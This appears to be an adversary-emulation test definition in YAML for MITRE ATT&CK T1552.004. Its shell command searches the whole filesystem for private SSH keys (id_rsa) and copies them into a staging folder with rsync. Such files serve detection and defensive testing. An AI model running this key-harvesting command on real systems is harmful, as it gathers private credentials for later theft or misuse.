- description: 'Copy private SSH keys on a FreeBSD system to a staging folder using
    the `rsync` command.

    '
  id: d39e22a9-9fd0-b29f-d6d5-8aab4d5bb276
  name: Copy Private SSH Keys with rsync (freebsd)
  platforms:
    linux:
      sh:
        cleanup: rm -rf /tmp/art-staging
        command: 'if [ ! -x "$(command -v rsync)" ]; then (which pkg && pkg install
          -y rsync); fi;  ;  mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null
          -exec rsync -R {} /tmp/art-staging \; '
        payloads: []
  tactic: credential-access
  technique:
    attack_id: T1552.004
    name: 'Unsecured Credentials: Private Keys'
